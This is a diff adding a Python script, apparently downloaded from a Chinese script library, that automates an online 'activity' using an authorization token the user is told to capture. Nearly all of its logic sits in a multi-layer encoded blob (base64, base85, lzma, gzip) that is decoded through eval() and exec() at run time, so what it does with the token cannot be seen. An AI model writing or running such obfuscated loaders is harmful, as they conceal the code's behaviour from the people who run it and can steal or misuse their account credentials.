@@ -1,0 +1,17 @@
+# 当前脚本来自于http://script.345yun.cn脚本库下载！
+# 活动入口    https://img13.360buyimg.com/ddimg/jfs/t1/338700/26/13599/21242/68d12cdbF8bcc0a20/9c6fcdeec6c77753.jpg
+#变量 pxs   抓authori-zation 里的值
+import base64,zlib,lzma,gzip,bz2
+BASE62_CHARS="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+def _base62_dec(d):
+ d_s=d.decode();n=0
+ for c in d_s:n=n*62+BASE62_CHARS.index(c)
+ return n.to_bytes((n.bit_length()+7)//8,"big")if n else b"\x00"
+def d(d,ops):
+ for op in reversed(ops):
+  d=zlib.decompress(d)if op=="zlib"else lzma.decompress(d)if op=="lzma"else gzip.decompress(d)if op=="gzip"else bz2.decompress(d)if op=="bz2"else base64.b64decode(d)if op=="base64"else base64.b32decode(d)if op=="base32"else _base62_dec(d)if op=="base62"else base64.b85decode(d)
+ return d.decode()
+e,b="e1dwNDhTXnhrOT1HTEBFMHN0V2E3NjFTTWJUOCRqMFJ6K0Bpd0ZQe1hVfUs/fEJZMTVQdmJAdXp4JUhrY0BIR3IjMiExfUteITJ2K2FkXkJpRVV8NVh5U35NU3NhZ2RKUHY2aHEtd2hvYURYNSF0eSlDWXMpd3Fvc3pPaU9eMEVEQVp+YGEoZys5a0lsPWV+fEpUdmRULX19OWZuYTRVRjdaTTVqRHhramY2JjljUS1BKWo8JHZjWG8xajBkY05OcjIkYEJoIS1YZ3gtXy13cF9DNjhANEEmRWclTWN1V194PUBEeEtSKlNNT1JUYnFDeDtvejxAMUtNfWVpO3RHeCFFM0dANHBMJlV6MCQjeG5PLUY4RiFUakN0JXtmKX1vVFMtUERaTl5KbWZ1dnlzYXNkU0YqbzVQWTZzdTF1Km5odT5iR29aTWE8amdFZ0E/WTw5cFBYRWI/Q1RgVTkxVk1YRHJpYD9ydj8qeSk7UkR9YnFFSWRGMDskWigmcG9QRWt4RCR6VmIrOTlmOVoycSZCUyYjN285c0ohMmApJG4mXy1YKSopXnkoKThRZStEYW15aE10WE0ybGF6bzVeJFJjcFVNYXZOSVAzano9R09UUCFZK0s5ezV5cm5NRjQjVkMxQyFvNHMtK1p7ZFBySDArOUxsWSpmZTE+R1lwbnphUyNQXn5SSFBVMH5EZD1eeWhnc2pmeyV5RWNiJkBmNlpHZEprWHFJdEl8SUJPeSFLWntIZz1NQj5ePTQpc25VYHx2Ml9fO0Ihbks9VnZmWik8QitVJXkkSmR9JkIoWiYqIWRMZFdSYXomSXtgc2hWe0lmRVJ3TEQ3ZlErVGR5UTNEaThRWGRjTEZaTldRS0gqI2VTWWI5WE9qNTA9Yi1lMyt6dEhkVVBDOVhiUWQlNiVBVnh3Rl9eKldxWnBEZ0puSFZmRnFNbDR4O3FNSFM8dHVzc1RJYHdfKHd5NGt9PVM4ZlU8c3dldW8+fDU/U0lhJDFxY3ZLQzteezxtaWdgRyY5Jl56T2xgbypQYHI2e05NWUlmXjQ0X0pTenI5e3RMR3VmWFF7eV53Kj5rfkxQfWlxIVMwezA7P3N7IW0pUlM1MlRELX5QeVVeLTBGTjIhWWM4SGBJKURXdCYxI2U/fmAyQT8tO08xeUpJekFocDU2NVN9aEcjJEJVaElVWSFfaWwjPEpXKE4ybTRvbD58Un4mI1d1R1d5OSMoJVp4RWx0eSlfRzNJZndKNXFUO3glTH0oYSF0Jis9XjNXb0E7aE5DekNidipHR3pqT2V7OCFjTCpjWkQ7a1FtTGVvai1iX2UhdHleJkJrSj12O2xVMkRrQit8PnBZSChzVTVYSll4VlRIQEZ9alo7VnVeR35NdnVgd3QpZXVFQiVybHQxX1JZO18tYSloMEpOJFY/WEFvSjNAMUFecWNYUzRCd2RGTnokO2FtKF5+eTM9PWFzRnQoaHBhPi1UVE4/WCZSbVpNZUk0YkB8dSRAYUwjRC15TXY4KmpEMCtWeW0kPjdGSk9sSEBZVy1eb0Zxe0F4JGZmNjcyUUt5VjM4anEwKnpoLT5QVTMxcyY8OSF6IXp5NF5SUWEyb2Z8SktnazV2Sm5xWEI0QkhIdiZaZkVQM1JlZVEldGdQJTNxVW5WZG91a3VyOWFXTCN7fmNZMDAwMDA9P1R+c1Nre2U8MDBIZD4pZHY2b3poNyQ0dkJZUWwwc3NJMjAwZGNE","WydnemlwJywgJ2x6bWEnLCAnYmFzZTg1J10=";o=eval(base64.b64decode(b).decode())
+try:exec(d(base64.b64decode(e),o))
+except Exception as x:print(f"Error:{x}")
+# 当前脚本来自于http://script.345yun.cn脚本库下载！
